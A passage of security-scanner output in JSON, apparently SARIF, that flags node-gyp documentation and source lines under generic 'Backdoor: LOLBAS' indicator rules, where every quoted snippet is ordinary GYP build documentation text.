                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/InputFormatReference.md"
                },
                "region": {
                  "startLine": 49,
                  "startColumn": 50,
                  "endLine": 49,
                  "endColumn": 54,
                  "snippet": {
                    "text": "\n## Overall Structure\n\nA GYP input file is organized as structured data.  At the root scope of\neach `.gyp` or `.gypi` (include) file is a dictionary.  The keys and\nvalues of this dictionary, along with any descendants contained within\nthe values, provide the data contained within the file.  This data is\n",
                    "rendered": {
                      "text": "\n## Overall Structure\n\nA GYP input file is organized as structured data.  At the root scope of\neach `.gyp` or `.gypi` (include) file is a dictionary.  The keys and\nvalues of this dictionary, along with any descendants contained within\nthe values, provide the data contained within the file.  This data is\n",
                      "markdown": "`\n## Overall Structure\n\nA GYP input file is organized as structured data.  At the root scope of\neach `.gyp` or `.gypi` (include) file is a dictionary.  The keys and\nvalues of this dictionary, along with any descendants contained within\nthe values, provide the data contained within the file.  This data is\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/InputFormatReference.md"
                },
                "region": {
                  "startLine": 969,
                  "startColumn": 57,
                  "endLine": 969,
                  "endColumn": 63,
                  "snippet": {
                    "text": "list.  In the example above, when `OS` is `mac`, `sources_excluded`\nwould be set to `['io_win.cc', 'platform_util_linux.cc']`.  Some GYP\ngenerators use this feature to display excluded files in the project\nfiles they generate for the convenience of users, who may wish to refer\nto other implementations.\n\n## Processing Order\n",
                    "rendered": {
                      "text": "list.  In the example above, when `OS` is `mac`, `sources_excluded`\nwould be set to `['io_win.cc', 'platform_util_linux.cc']`.  Some GYP\ngenerators use this feature to display excluded files in the project\nfiles they generate for the convenience of users, who may wish to refer\nto other implementations.\n\n## Processing Order\n",
                      "markdown": "`list.  In the example above, when `OS` is `mac`, `sources_excluded`\nwould be set to `['io_win.cc', 'platform_util_linux.cc']`.  Some GYP\ngenerators use this feature to display excluded files in the project\nfiles they generate for the convenience of users, who may wish to refer\nto other implementations.\n\n## Processing Order\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/InputFormatReference.md"
                },
                "region": {
                  "startLine": 753,
                  "startColumn": 52,
                  "endLine": 753,
                  "endColumn": 58,
                  "snippet": {
                    "text": "      'type': 'static_library',\n      'sources': ['cruncher.cc'],\n      'direct_dependent_settings': {\n        'include_dirs': ['.'],  # dependents need to find cruncher.h.\n      },\n      'link_settings': {\n        'libraries': ['-lm'],  # cruncher.cc does math.\n",
                    "rendered": {
                      "text": "      'type': 'static_library',\n      'sources': ['cruncher.cc'],\n      'direct_dependent_settings': {\n        'include_dirs': ['.'],  # dependents need to find cruncher.h.\n      },\n      'link_settings': {\n        'libraries': ['-lm'],  # cruncher.cc does math.\n",
                      "markdown": "`      'type': 'static_library',\n      'sources': ['cruncher.cc'],\n      'direct_dependent_settings': {\n        'include_dirs': ['.'],  # dependents need to find cruncher.h.\n      },\n      'link_settings': {\n        'libraries': ['-lm'],  # cruncher.cc does math.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/InputFormatReference.md"
                },
                "region": {
                  "startLine": 682,
                  "startColumn": 45,
                  "endLine": 682,
                  "endColumn": 53,
                  "snippet": {
                    "text": "  * Recurse into child dictionaries or lists that have not yet been\n    processed.\n\nOne quirk of this ordering is that you cannot expect a\n[variables](#variables) section within a dictionary’s\n[conditional](#Conditionals) to be effective in the dictionary\nitself, but the added variables will be effective in any child\n",
                    "rendered": {
                      "text": "  * Recurse into child dictionaries or lists that have not yet been\n    processed.\n\nOne quirk of this ordering is that you cannot expect a\n[variables](#variables) section within a dictionary’s\n[conditional](#Conditionals) to be effective in the dictionary\nitself, but the added variables will be effective in any child\n",
                      "markdown": "`  * Recurse into child dictionaries or lists that have not yet been\n    processed.\n\nOne quirk of this ordering is that you cannot expect a\n[variables](#variables) section within a dictionary’s\n[conditional](#Conditionals) to be effective in the dictionary\nitself, but the added variables will be effective in any child\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/InputFormatReference.md"
                },
                "region": {
                  "startLine": 539,
                  "startColumn": 5,
                  "endLine": 539,
                  "endColumn": 13,
                  "snippet": {
                    "text": "}\n```\n\nmight expand to:\n\n```\n{\n",
                    "rendered": {
                      "text": "}\n```\n\nmight expand to:\n\n```\n{\n",
                      "markdown": "`}\n```\n\nmight expand to:\n\n```\n{\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/InputFormatReference.md"
                },
                "region": {
                  "startLine": 487,
                  "startColumn": 21,
                  "endLine": 487,
                  "endColumn": 27,
                  "snippet": {
                    "text": "\nCommand expansions function similarly to variable expansions, but\ninstead of resolving variable references, they cause GYP to execute a\ncommand at generation time and use the command’s output as the\nreplacement.  Command expansions are introduced by a less than and\nexclamation mark (`<!`).\n\n",
                    "rendered": {
                      "text": "\nCommand expansions function similarly to variable expansions, but\ninstead of resolving variable references, they cause GYP to execute a\ncommand at generation time and use the command’s output as the\nreplacement.  Command expansions are introduced by a less than and\nexclamation mark (`<!`).\n\n",
                      "markdown": "`\nCommand expansions function similarly to variable expansions, but\ninstead of resolving variable references, they cause GYP to execute a\ncommand at generation time and use the command’s output as the\nreplacement.  Command expansions are introduced by a less than and\nexclamation mark (`<!`).\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/InputFormatReference.md"
                },
                "region": {
                  "startLine": 478,
                  "startColumn": 63,
                  "endLine": 479,
                  "snippet": {
                    "text": "      above.  The conversion into a list is generator-specific, but\n      generally, spaces in the string are taken as separators between\n      list items.  The specific method of converting the string to a\n      list should be the inverse of the encoding method used to expand\n      list variables in string context, above.\n\nGYP treats references to undefined variables as errors.\n\n",
                    "rendered": {
                      "text": "      above.  The conversion into a list is generator-specific, but\n      generally, spaces in the string are taken as separators between\n      list items.  The specific method of converting the string to a\n      list should be the inverse of the encoding method used to expand\n      list variables in string context, above.\n\nGYP treats references to undefined variables as errors.\n\n",
                      "markdown": "`      above.  The conversion into a list is generator-specific, but\n      generally, spaces in the string are taken as separators between\n      list items.  The specific method of converting the string to a\n      list should be the inverse of the encoding method used to expand\n      list variables in string context, above.\n\nGYP treats references to undefined variables as errors.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/InputFormatReference.md"
                },
                "region": {
                  "startLine": 362,
                  "startColumn": 3,
                  "endLine": 362,
                  "endColumn": 9,
                  "snippet": {
                    "text": "\nWithin a `variables` section, keys named with percent sign (`%`)\nsuffixes mean that the variable should be set only if it is undefined at\nthe time it is processed.  This can be used to provide defaults for\nvariables that would otherwise be undefined, so that they may reliably\nbe used in [variable expansion or conditional\nprocessing](#Variables_and_Conditionals).\n",
                    "rendered": {
                      "text": "\nWithin a `variables` section, keys named with percent sign (`%`)\nsuffixes mean that the variable should be set only if it is undefined at\nthe time it is processed.  This can be used to provide defaults for\nvariables that would otherwise be undefined, so that they may reliably\nbe used in [variable expansion or conditional\nprocessing](#Variables_and_Conditionals).\n",
                      "markdown": "`\nWithin a `variables` section, keys named with percent sign (`%`)\nsuffixes mean that the variable should be set only if it is undefined at\nthe time it is processed.  This can be used to provide defaults for\nvariables that would otherwise be undefined, so that they may reliably\nbe used in [variable expansion or conditional\nprocessing](#Variables_and_Conditionals).\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/InputFormatReference.md"
                },
                "region": {
                  "startLine": 266,
                  "startColumn": 41,
                  "endLine": 266,
                  "endColumn": 47,
                  "snippet": {
                    "text": "\nSome list items are treated as singletons, and the list merge process\nwill enforce special rules when merging them.  At present, any string\nitem in a list that does not begin with a dash (`-`) is treated as a\nsingleton, although **this is subject to change.**  When appending or\nprepending a singleton to a list, if the item is already in the list,\nonly the earlier instance is retained in the merged list.\n",
                    "rendered": {
                      "text": "\nSome list items are treated as singletons, and the list merge process\nwill enforce special rules when merging them.  At present, any string\nitem in a list that does not begin with a dash (`-`) is treated as a\nsingleton, although **this is subject to change.**  When appending or\nprepending a singleton to a list, if the item is already in the list,\nonly the earlier instance is retained in the merged list.\n",
                      "markdown": "`\nSome list items are treated as singletons, and the list merge process\nwill enforce special rules when merging them.  At present, any string\nitem in a list that does not begin with a dash (`-`) is treated as a\nsingleton, although **this is subject to change.**  When appending or\nprepending a singleton to a list, if the item is already in the list,\nonly the earlier instance is retained in the merged list.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/InputFormatReference.md"
                },
                "region": {
                  "startLine": 234,
                  "startColumn": 67,
                  "endLine": 235,
                  "snippet": {
                    "text": "```\n{\n  'include_dirs': ['include'],  # Treated as relative to ../build\n  'libraries': ['-lz'],  # Not treated as a pathname, begins with a dash\n  'defines': ['NDEBUG'],  # defines does not contain pathnames\n}\n```\n\n",
                    "rendered": {
                      "text": "```\n{\n  'include_dirs': ['include'],  # Treated as relative to ../build\n  'libraries': ['-lz'],  # Not treated as a pathname, begins with a dash\n  'defines': ['NDEBUG'],  # defines does not contain pathnames\n}\n```\n\n",
                      "markdown": "````\n{\n  'include_dirs': ['include'],  # Treated as relative to ../build\n  'libraries': ['-lz'],  # Not treated as a pathname, begins with a dash\n  'defines': ['NDEBUG'],  # defines does not contain pathnames\n}\n```\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/UserDocumentation.md"
                },
                "region": {
                  "startLine": 867,
                  "startColumn": 52,
                  "endLine": 867,
                  "endColumn": 56,
                  "snippet": {
                    "text": "files.  (In the above example, these are the `LOCAL_DEFINE_FOR_LIBBAR`\ndefine, and the `..` entry in the `include_dirs` list.)\n\n#### When a library depends on an additional library at final link time\n\n```\n  {\n",
                    "rendered": {
                      "text": "files.  (In the above example, these are the `LOCAL_DEFINE_FOR_LIBBAR`\ndefine, and the `..` entry in the `include_dirs` list.)\n\n#### When a library depends on an additional library at final link time\n\n```\n  {\n",
                      "markdown": "`files.  (In the above example, these are the `LOCAL_DEFINE_FOR_LIBBAR`\ndefine, and the `..` entry in the `include_dirs` list.)\n\n#### When a library depends on an additional library at final link time\n\n```\n  {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/UserDocumentation.md"
                },
                "region": {
                  "startLine": 705,
                  "startColumn": 71,
                  "endLine": 706,
                  "endColumn": 3,
                  "snippet": {
                    "text": "```\n\nThe use of the `<(library)` variable above should be the default `type`\nsetting for most library targets, as it allows the developer to choose,\nat `gyp` time, whether to build with static or shared libraries.\n(Building with shared libraries saves a _lot_ of link time on Linux.)\n\nIt may be necessary to build a specific library as a fixed type.  Is so,\n",
                    "rendered": {
                      "text": "```\n\nThe use of the `<(library)` variable above should be the default `type`\nsetting for most library targets, as it allows the developer to choose,\nat `gyp` time, whether to build with static or shared libraries.\n(Building with shared libraries saves a _lot_ of link time on Linux.)\n\nIt may be necessary to build a specific library as a fixed type.  Is so,\n",
                      "markdown": "````\n\nThe use of the `<(library)` variable above should be the default `type`\nsetting for most library targets, as it allows the developer to choose,\nat `gyp` time, whether to build with static or shared libraries.\n(Building with shared libraries saves a _lot_ of link time on Linux.)\n\nIt may be necessary to build a specific library as a fixed type.  Is so,\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/UserDocumentation.md"
                },
                "region": {
                  "startLine": 285,
                  "startColumn": 37,
                  "endLine": 285,
                  "endColumn": 45,
                  "snippet": {
                    "text": "\n`'export_dependent_settings'`: This lists the targets whose\n`direct_dependent_settings` should be \"passed on\" to other targets that\nuse (depend on) this target.  `TODO:  expand on this description.`\n\n## Use Cases\n\n",
                    "rendered": {
                      "text": "\n`'export_dependent_settings'`: This lists the targets whose\n`direct_dependent_settings` should be \"passed on\" to other targets that\nuse (depend on) this target.  `TODO:  expand on this description.`\n\n## Use Cases\n\n",
                      "markdown": "`\n`'export_dependent_settings'`: This lists the targets whose\n`direct_dependent_settings` should be \"passed on\" to other targets that\nuse (depend on) this target.  `TODO:  expand on this description.`\n\n## Use Cases\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/UserDocumentation.md"
                },
                "region": {
                  "startLine": 271,
                  "startColumn": 22,
                  "endLine": 271,
                  "endColumn": 26,
                  "snippet": {
                    "text": "\n`'type'`: This should almost always be set to '<(library)', which allows\nthe user to define at gyp time whether libraries are to be built static\nor shared.  (On Linux, at least, linking with shared libraries saves\nsignificant link time.) If it's necessary to pin down the type of\nlibrary to be built, the `type` can be set explicitly to\n`static_library` or `shared_library`.\n",
                    "rendered": {
                      "text": "\n`'type'`: This should almost always be set to '<(library)', which allows\nthe user to define at gyp time whether libraries are to be built static\nor shared.  (On Linux, at least, linking with shared libraries saves\nsignificant link time.) If it's necessary to pin down the type of\nlibrary to be built, the `type` can be set explicitly to\n`static_library` or `shared_library`.\n",
                      "markdown": "`\n`'type'`: This should almost always be set to '<(library)', which allows\nthe user to define at gyp time whether libraries are to be built static\nor shared.  (On Linux, at least, linking with shared libraries saves\nsignificant link time.) If it's necessary to pin down the type of\nlibrary to be built, the `type` can be set explicitly to\n`static_library` or `shared_library`.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/UserDocumentation.md"
                },
                "region": {
                  "startLine": 270,
                  "startColumn": 18,
                  "endLine": 270,
                  "endColumn": 22,
                  "snippet": {
                    "text": "`include_dirs`, etc.).  The differences include:\n\n`'type'`: This should almost always be set to '<(library)', which allows\nthe user to define at gyp time whether libraries are to be built static\nor shared.  (On Linux, at least, linking with shared libraries saves\nsignificant link time.) If it's necessary to pin down the type of\nlibrary to be built, the `type` can be set explicitly to\n",
                    "rendered": {
                      "text": "`include_dirs`, etc.).  The differences include:\n\n`'type'`: This should almost always be set to '<(library)', which allows\nthe user to define at gyp time whether libraries are to be built static\nor shared.  (On Linux, at least, linking with shared libraries saves\nsignificant link time.) If it's necessary to pin down the type of\nlibrary to be built, the `type` can be set explicitly to\n",
                      "markdown": "``include_dirs`, etc.).  The differences include:\n\n`'type'`: This should almost always be set to '<(library)', which allows\nthe user to define at gyp time whether libraries are to be built static\nor shared.  (On Linux, at least, linking with shared libraries saves\nsignificant link time.) If it's necessary to pin down the type of\nlibrary to be built, the `type` can be set explicitly to\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/UserDocumentation.md"
                },
                "region": {
                  "startLine": 200,
                  "startColumn": 63,
                  "endLine": 201,
                  "snippet": {
                    "text": "\n`'sources'`: The source files for this target.\n\n`'conditions'`: A block of conditions that will be evaluated to update\nthe different settings in the target dictionary.\n\n## Skeleton of a typical library target in a .gyp file\n\n",
                    "rendered": {
                      "text": "\n`'sources'`: The source files for this target.\n\n`'conditions'`: A block of conditions that will be evaluated to update\nthe different settings in the target dictionary.\n\n## Skeleton of a typical library target in a .gyp file\n\n",
                      "markdown": "`\n`'sources'`: The source files for this target.\n\n`'conditions'`: A block of conditions that will be evaluated to update\nthe different settings in the target dictionary.\n\n## Skeleton of a typical library target in a .gyp file\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/UserDocumentation.md"
                },
                "region": {
                  "startLine": 867,
                  "startColumn": 66,
                  "endLine": 868,
                  "snippet": {
                    "text": "files.  (In the above example, these are the `LOCAL_DEFINE_FOR_LIBBAR`\ndefine, and the `..` entry in the `include_dirs` list.)\n\n#### When a library depends on an additional library at final link time\n\n```\n  {\n    'targets': [\n",
                    "rendered": {
                      "text": "files.  (In the above example, these are the `LOCAL_DEFINE_FOR_LIBBAR`\ndefine, and the `..` entry in the `include_dirs` list.)\n\n#### When a library depends on an additional library at final link time\n\n```\n  {\n    'targets': [\n",
                      "markdown": "`files.  (In the above example, these are the `LOCAL_DEFINE_FOR_LIBBAR`\ndefine, and the `..` entry in the `include_dirs` list.)\n\n#### When a library depends on an additional library at final link time\n\n```\n  {\n    'targets': [\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/UserDocumentation.md"
                },
                "region": {
                  "startLine": 707,
                  "startColumn": 53,
                  "endLine": 707,
                  "endColumn": 59,
                  "snippet": {
                    "text": "The use of the `<(library)` variable above should be the default `type`\nsetting for most library targets, as it allows the developer to choose,\nat `gyp` time, whether to build with static or shared libraries.\n(Building with shared libraries saves a _lot_ of link time on Linux.)\n\nIt may be necessary to build a specific library as a fixed type.  Is so,\nthe `type` field can be hard-wired appropriately.  For a static library:\n",
                    "rendered": {
                      "text": "The use of the `<(library)` variable above should be the default `type`\nsetting for most library targets, as it allows the developer to choose,\nat `gyp` time, whether to build with static or shared libraries.\n(Building with shared libraries saves a _lot_ of link time on Linux.)\n\nIt may be necessary to build a specific library as a fixed type.  Is so,\nthe `type` field can be hard-wired appropriately.  For a static library:\n",
                      "markdown": "`The use of the `<(library)` variable above should be the default `type`\nsetting for most library targets, as it allows the developer to choose,\nat `gyp` time, whether to build with static or shared libraries.\n(Building with shared libraries saves a _lot_ of link time on Linux.)\n\nIt may be necessary to build a specific library as a fixed type.  Is so,\nthe `type` field can be hard-wired appropriately.  For a static library:\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/UserDocumentation.md"
                },
                "region": {
                  "startLine": 649,
                  "startColumn": 3,
                  "endLine": 649,
                  "endColumn": 9,
                  "snippet": {
                    "text": "\nIf the variable `GYP_CROSSCOMPILE` or one of the toolchain-related\nvariables (like `CC_host` or `CC_target`) is set, GYP will think that\nyou wish to do a cross-compile.\n\nWhen cross-compiling, each target can be part of a \"host\" build, a\n\"target\" build, or both. By default, the target is assumed to be (only)\n",
                    "rendered": {
                      "text": "\nIf the variable `GYP_CROSSCOMPILE` or one of the toolchain-related\nvariables (like `CC_host` or `CC_target`) is set, GYP will think that\nyou wish to do a cross-compile.\n\nWhen cross-compiling, each target can be part of a \"host\" build, a\n\"target\" build, or both. By default, the target is assumed to be (only)\n",
                      "markdown": "`\nIf the variable `GYP_CROSSCOMPILE` or one of the toolchain-related\nvariables (like `CC_host` or `CC_target`) is set, GYP will think that\nyou wish to do a cross-compile.\n\nWhen cross-compiling, each target can be part of a \"host\" build, a\n\"target\" build, or both. By default, the target is assumed to be (only)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/UserDocumentation.md"
                },
                "region": {
                  "startLine": 285,
                  "startColumn": 37,
                  "endLine": 285,
                  "endColumn": 45,
                  "snippet": {
                    "text": "\n`'export_dependent_settings'`: This lists the targets whose\n`direct_dependent_settings` should be \"passed on\" to other targets that\nuse (depend on) this target.  `TODO:  expand on this description.`\n\n## Use Cases\n\n",
                    "rendered": {
                      "text": "\n`'export_dependent_settings'`: This lists the targets whose\n`direct_dependent_settings` should be \"passed on\" to other targets that\nuse (depend on) this target.  `TODO:  expand on this description.`\n\n## Use Cases\n\n",
                      "markdown": "`\n`'export_dependent_settings'`: This lists the targets whose\n`direct_dependent_settings` should be \"passed on\" to other targets that\nuse (depend on) this target.  `TODO:  expand on this description.`\n\n## Use Cases\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/UserDocumentation.md"
                },
                "region": {
                  "startLine": 270,
                  "startColumn": 25,
                  "endLine": 270,
                  "endColumn": 31,
                  "snippet": {
                    "text": "`include_dirs`, etc.).  The differences include:\n\n`'type'`: This should almost always be set to '<(library)', which allows\nthe user to define at gyp time whether libraries are to be built static\nor shared.  (On Linux, at least, linking with shared libraries saves\nsignificant link time.) If it's necessary to pin down the type of\nlibrary to be built, the `type` can be set explicitly to\n",
                    "rendered": {
                      "text": "`include_dirs`, etc.).  The differences include:\n\n`'type'`: This should almost always be set to '<(library)', which allows\nthe user to define at gyp time whether libraries are to be built static\nor shared.  (On Linux, at least, linking with shared libraries saves\nsignificant link time.) If it's necessary to pin down the type of\nlibrary to be built, the `type` can be set explicitly to\n",
                      "markdown": "``include_dirs`, etc.).  The differences include:\n\n`'type'`: This should almost always be set to '<(library)', which allows\nthe user to define at gyp time whether libraries are to be built static\nor shared.  (On Linux, at least, linking with shared libraries saves\nsignificant link time.) If it's necessary to pin down the type of\nlibrary to be built, the `type` can be set explicitly to\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/README.md"
                },
                "region": {
                  "startLine": 23,
                  "startColumn": 17,
                  "endLine": 23,
                  "endColumn": 23,
                  "snippet": {
                    "text": "using the IDE.\n\nGYP can also be used to generate \"hybrid\" projects that provide the IDE\nscaffolding for a nice user experience but call out to Ninja to do the actual\nbuilding (which is usually much faster than the native build systems of the\nIDEs).\n\n",
                    "rendered": {
                      "text": "using the IDE.\n\nGYP can also be used to generate \"hybrid\" projects that provide the IDE\nscaffolding for a nice user experience but call out to Ninja to do the actual\nbuilding (which is usually much faster than the native build systems of the\nIDEs).\n\n",
                      "markdown": "`using the IDE.\n\nGYP can also be used to generate \"hybrid\" projects that provide the IDE\nscaffolding for a nice user experience but call out to Ninja to do the actual\nbuilding (which is usually much faster than the native build systems of the\nIDEs).\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/analyzer.py"
                },
                "region": {
                  "startLine": 669,
                  "startColumn": 62,
                  "endLine": 669,
                  "endColumn": 66,
                  "snippet": {
                    "text": "        return result\n\n    def is_build_impacted(self):\n        \"\"\"Returns true if the supplied files impact the build at all.\"\"\"\n        return self._changed_targets\n\n    def find_matching_test_target_names(self):\n",
